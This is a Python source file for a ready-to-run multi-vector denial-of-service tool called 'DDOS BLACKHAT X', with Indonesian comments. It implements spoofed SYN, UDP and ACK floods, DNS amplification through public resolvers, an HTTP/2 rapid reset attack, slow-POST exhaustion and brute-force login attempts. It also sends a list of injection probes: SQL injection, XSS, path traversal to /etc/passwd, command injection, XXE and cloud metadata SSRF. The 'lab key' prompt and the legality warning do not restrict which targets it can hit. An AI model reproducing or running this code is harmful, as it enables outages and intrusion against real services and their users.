#!/usr/bin/env python3
# ====================================================
# DDOS BLACKHAT X - MULTI-VECTOR L4/L7 ENGINE
# FORMAT: Python -A <IP> P <p1.p2.p3> T <n> --mode <vec>
# WARNING: ILEGAL TANPA IZIN. GUNAKAN DI LAB SENDIRI.
# ====================================================

import sys, os, time, random, socket, ssl, threading, ipaddress, struct, json
import urllib3, warnings
from colorama import Fore, Style, init

warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# --- Deps ---
try:
    from scapy.all import IP, TCP, UDP, Raw, send, RandIP, RandShort
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

try:
    import cloudscraper
except ImportError:
    cloudscraper = None

try:
    from curl_cffi import requests as cffi_requests
    CFFI_OK = True
except ImportError:
    CFFI_OK = False

try:
    import h2.connection, h2.config
    H2_OK = True
except ImportError:
    H2_OK = False

# ====================================================
# CONFIG
# ====================================================
LAB_KEY = "XD"
U_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
]
REFERRERS = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"]

PROBE_PAYLOADS = [
    "' OR '1'='1", "'; DROP TABLE u;--", "<script>alert(1)</script>",
    "../../../../etc/passwd", "..%2f..%2fetc%2fpasswd", "php://filter/convert.base64-encode/resource=index",
    "$(sleep 5)", "|whoami", "`id`", "{\"$ne\":null}", "{\"$gt\":\"\"}",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
    "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd",
]

# ====================================================
# ENGINE
# ====================================================

class BlackhatEngine:
    def __init__(self, ip, ports, threads, mode="mix", aggressive=False, duration=60):
        self.ip = ip
        self.ports = ports
        self.threads = threads
        self.mode = mode
        self.aggressive = aggressive
        self.duration = duration
        self.counter = 0
        self.lock = threading.Lock()
        self.running = True
        self.scraper = cloudscraper.create_scraper(
            browser={'browser':'chrome','platform':'windows','mobile':False,'desktop':True}
        ) if cloudscraper else None

    def _inc(self, n=1):
        with self.lock: self.counter += n

    def _rand_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    # ---------- L4: SYN FLOOD (source spoof) ----------
    def syn_flood(self, port):
        if not SCAPY_OK:
            print("[!] scapy tidak ada, skip syn_flood"); return
        while self.running:
            try:
                pkt = IP(src=RandIP(), dst=self.ip) / \
                      TCP(sport=RandShort(), dport=port, flags="S",
                          seq=random.randint(0, 2**32-1))
                send(pkt, verbose=False)
                self._inc()
                if not self.aggressive:
                    time.sleep(random.uniform(0.0005, 0.002))
            except Exception:
                pass

    # ---------- L4: UDP FLOOD ----------
    def udp_flood(self, port):
        if not SCAPY_OK:
            print("[!] scapy tidak ada, skip udp_flood"); return
        while self.running:
            try:
                pkt = IP(src=RandIP(), dst=self.ip) / \
                      UDP(sport=RandShort(), dport=port) / \
                      Raw(load=os.urandom(random.randint(64, 1400)))
                send(pkt, verbose=False)
                self._inc()
                if not self.aggressive:
                    time.sleep(random.uniform(0.0005, 0.002))
            except Exception:
                pass

    # ---------- L4: ACK FLOOD ----------
    def ack_flood(self, port):
        if not SCAPY_OK:
            print("[!] scapy tidak ada, skip ack_flood"); return
        while self.running:
            try:
                pkt = IP(src=RandIP(), dst=self.ip) / \
                      TCP(sport=RandShort(), dport=port, flags="A",
                          seq=random.randint(0, 2**32-1),
                          ack=random.randint(0, 2**32-1))
                send(pkt, verbose=False)
                self._inc()
                if not self.aggressive:
                    time.sleep(random.uniform(0.0005, 0.002))
            except Exception:
                pass

    # ---------- L4: DNS AMPLIFICATION (reflection) ----------
    def dns_amp(self, port):
        """Kirim DNS query dengan source = target IP ke resolver publik.
        Resolver akan balas ke target -> amplification.
        Hanya simulasi (source spoof butuh root + scapy)."""
        if not SCAPY_OK:
            print("[!] scapy tidak ada, skip dns_amp"); return
        resolvers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "64.6.64.6"]
        # Domain dengan respons besar (ANY query) untuk amplifikasi
        domains = ["isc.org", "google.com", "cloudflare.com", "example.com"]
        while self.running:
            try:
                domain = random.choice(domains)
                # build DNS query manual
                q = bytearray()
                qid = random.randint(1, 65535)
                q += qid.to_bytes(2, "big")
                q += b"\x01\x00"  # flags: standard query
                q += b"\x00\x01"  # QDCOUNT
                q += b"\x00\x00\x00\x00\x00\x00"
                for part in domain.split("."):
                    q.append(len(part)); q += part.encode()
                q.append(0)
                q += b"\x00\xff"  # QTYPE ANY
                q += b"\x00\x01"  # QCLASS IN
                resolver = random.choice(resolvers)
                # spoof source = target IP
                pkt = IP(src=self.ip, dst=resolver) / \
                      UDP(sport=random.randint(1024,65535), dport=53) / \
                      Raw(load=bytes(q))
                send(pkt, verbose=False)
                self._inc()
                if not self.aggressive:
                    time.sleep(random.uniform(0.001, 0.005))
            except Exception:
                pass

    # ---------- L7: HTTP/2 RAPID RESET (CVE-2023-44487 style) ----------
    def h2_rapid_reset(self, port):
        if not H2_OK:
            print("[!] h2 tidak ada, skip h2_rapid_reset"); return
        use_ssl = port in (443, 8443, 9443)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    ctx.set_alpn_protocols(["h2"])
                    s = ctx.wrap_socket(s, server_hostname=self.ip)
                s.connect((self.ip, port))

                conf = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
                conn = h2.connection.H2Connection(config=conf)
                conn.initiate_connection()
                s.sendall(conn.data_to_send())

                # buka banyak stream lalu RST_STREAM cepat
                for sid in range(1, 200, 2):
                    headers = [
                        (":method", "GET"),
                        (":path", f"/?x={random.randint(1,9999)}"),
                        (":scheme", "https" if use_ssl else "http"),
                        (":authority", f"{self.ip}:{port}"),
                        ("user-agent", random.choice(U_AGENTS)),
                    ]
                    try:
                        conn.send_headers(sid, headers, end_stream=False)
                        conn.reset_stream(sid)
                        self._inc()
                    except Exception:
                        pass
                try:
                    s.sendall(conn.data_to_send())
                except Exception:
                    pass
                s.close()
                if not self.aggressive:
                    time.sleep(random.uniform(0.001, 0.01))
            except Exception:
                pass

    # ---------- L7: RUDY (slow POST body) ----------
    def rudy(self, port):
        use_ssl = port in (443, 8443, 9443)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(6)
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.ip)
                s.connect((self.ip, port))
                body_len = 10_000_000
                req = (f"POST / HTTP/1.1\r\nHost: {self.ip}:{port}\r\n"
                       f"User-Agent: {random.choice(U_AGENTS)}\r\n"
                       f"Content-Type: application/x-www-form-urlencoded\r\n"
                       f"Content-Length: {body_len}\r\nConnection: keep-alive\r\n\r\n")
                s.send(req.encode())
                self._inc()
                # kirim body 1 byte per beberapa detik
                for _ in range(50):
                    if not self.running: break
                    s.send(b"a")
                    self._inc(0.05)
                    time.sleep(random.uniform(3, 8))
                s.close()
            except Exception:
                pass

    # ---------- L7: BRUTE FORCE LOGIN PROBE ----------
    def brute_login(self, port):
        scheme = "https" if port in (443, 8443, 9443) else "http"
        base = f"{scheme}://{self.ip}:{port}"
        endpoints = ["/login", "/admin", "/api/login", "/wp-login.php", "/user/login", "/signin"]
        users = ["admin", "root", "administrator", "user", "test", "guest"]
        while self.running:
            try:
                ep = random.choice(endpoints)
                u = random.choice(users)
                p = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(6,14)))
                headers = {"User-Agent": random.choice(U_AGENTS),
                           "X-Forwarded-For": self._rand_ip()}
                self.scraper.post(f"{base}{ep}",
                                  data={"username":u,"password":p,"user":u,"pass":p},
                                  headers=headers, timeout=4)
                self._inc()
                if not self.aggressive:
                    time.sleep(random.uniform(0.05, 0.2))
            except Exception:
                pass

    # ---------- L7: TLS FINGERPRINT SPOOF (curl_cffi) ----------
    def tls_fp(self, port):
        if not CFFI_OK:
            print("[!] curl_cffi tidak ada, skip tls_fp"); return
        scheme = "https" if port in (443, 8443, 9443) else "http"
        base = f"{scheme}://{self.ip}:{port}"
        browsers = ["chrome120", "chrome121", "safari17_0", "firefox121", "edge101"]
        while self.running:
            try:
                payload = random.choice(PROBE_PAYLOADS)
                cffi_requests.get(
                    f"{base}/?q={payload}",
                    impersonate=random.choice(browsers),
                    headers={"X-Forwarded-For": self._rand_ip(),
                             "Referer": random.choice(REFERRERS)},
                    timeout=5, verify=False,
                )
                self._inc()
                if not self.aggressive:
                    time.sleep(random.uniform(0.01, 0.05))
            except Exception:
                pass

    # ---------- DISPATCHER ----------
    def _spawn(self, fn, port):
        return threading.Thread(target=fn, args=(port,), daemon=True)

    def run(self):
        mode_map = {
            "syn": self.syn_flood,
            "udp": self.udp_flood,
            "ack": self.ack_flood,
            "dnsamp": self.dns_amp,
            "h2reset": self.h2_rapid_reset,
            "rudy": self.rudy,
            "brute": self.brute_login,
            "tlsfp": self.tls_fp,
        }
        if self.mode == "mix":
            selected = list(mode_map.values())
        else:
            if self.mode not in mode_map:
                print(f"{Fore.RED}[!] Mode tidak dikenal: {self.mode}{Style.RESET_ALL}")
                print(f"    Pilihan: {', '.join(mode_map.keys())}, mix")
                sys.exit(1)
            selected = [mode_map[self.mode]]

        print(f"{Fore.CYAN}[*] IP       : {self.ip}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Ports    : {self.ports}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Mode     : {self.mode} ({len(selected)} vektor){Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Threads  : {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Duration : {self.duration}s{Style.RESET_ALL}")
        if not SCAPY_OK:
            print(f"{Fore.RED}[!] scapy tidak terinstal — L4 (syn/udp/ack/dnsamp) DILEWATI{Style.RESET_ALL}")

        per_port = max(1, self.threads // len(self.ports))
        per_fn = max(1, per_port // len(selected))
        workers = []
        for port in self.ports:
            for fn in selected:
                for _ in range(per_fn):
                    workers.append(self._spawn(fn, port))

        print(f"{Fore.GREEN}[+] {len(workers)} worker spawned{Style.RESET_ALL}\n")
        for w in workers: w.start()

        start = time.time(); last = 0
        while time.time() - start < self.duration:
            elapsed = int(time.time() - start)
            aps = self.counter - last; last = self.counter
            bar_len = 30
            filled = int(bar_len * elapsed / self.duration) if self.duration else 0
            bar = f"{Fore.GREEN}{'█'*filled}{Fore.WHITE}{'░'*(bar_len-filled)}{Style.RESET_ALL}"
            print(f"\r{Fore.CYAN}[{elapsed}s/{self.duration}s] {bar} | "
                  f"Pkt/Req: {int(self.counter):,} | APS: {aps:.0f} | "
                  f"Threads: {threading.active_count()}{Style.RESET_ALL}",
                  end='', flush=True)
            time.sleep(1)

        self.running = False
        print(f"\n\n{Fore.GREEN}[+] Selesai. Total: {int(self.counter):,}{Style.RESET_ALL}")


# ====================================================
# CLI PARSER
# ====================================================

def parse_args(argv):
    ip, ports, threads, mode, aggressive, duration = None, None, None, "mix", False, 60
    i = 1
    while i < len(argv):
        tok = argv[i].upper()
        if tok == "-A":
            ip = argv[i+1]; i += 2
        elif tok == "P":
            ports = [int(p) for p in argv[i+1].split(".") if p.strip().isdigit()]; i += 2
        elif tok == "T":
            threads = int(argv[i+1]); i += 2
        elif tok in ("--MODE", "-M"):
            mode = argv[i+1].lower(); i += 2
        elif tok in ("--AGGRESSIVE", "-X"):
            aggressive = True; i += 1
        elif tok in ("--DURATION", "-D"):
            duration = int(argv[i+1]); i += 2
        else:
            i += 1

    if not ip or not ports or not threads:
        print(f"{Fore.RED}[!] Format: Python -A <IP> P <p1.p2...> T <n> [--mode <vec>] [-X] [-D <sec>]{Style.RESET_ALL}")
        sys.exit(1)
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        print(f"{Fore.RED}[!] IP invalid: {ip}{Style.RESET_ALL}"); sys.exit(1)

    return ip, ports, threads, mode, aggressive, duration


def banner():
    print(f"""{Fore.RED}
╔══════════════════════════════════════════════════╗
║   MFX BLACKHAT MODE - L4/L7 ATTACK-VECTOR ENGINE ║
║   MODES: syn udp ack dnsamp h2reset rudy brute   ║
║          tlsfp mix                               ║
║   FORMAT: Python -A <IP> P <p1.p2> T <n> -M mix  ║
╚══════════════════════════════════════════════════╝
{Style.RESET_ALL}""")


# ====================================================
# MAIN
# ====================================================

def main():
    banner()
    key = input(f"{Fore.YELLOW}[?] LAB KEY: {Style.RESET_ALL}").strip()
    if key != LAB_KEY:
        print(f"{Fore.RED}[!] Key salah.{Style.RESET_ALL}"); sys.exit(1)
    print(f"{Fore.GREEN}[+] OK.{Style.RESET_ALL}\n")

    ip, ports, threads, mode, aggressive, duration = parse_args(sys.argv)

    print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
    print(f"  IP: {ip} | Ports: {ports} | Threads: {threads}")
    print(f"  Mode: {mode} | Aggressive: {aggressive} | Dur: {duration}s")
    print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
    if input(f"\n{Fore.RED}[?] Launch? (yes/no): {Style.RESET_ALL}").lower() != "yes":
        sys.exit(0)

    engine = BlackhatEngine(ip, ports, threads, mode, aggressive, duration)
    try:
        engine.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted.{Style.RESET_ALL}")


if __name__ == "__main__":
    # butuh root untuk scapy
    if os.name == "posix" and os.geteuid() != 0:
        print(f"{Fore.YELLOW}[!] Jalankan sebagai root untuk L4 spoofing.{Style.RESET_ALL}")
    main()
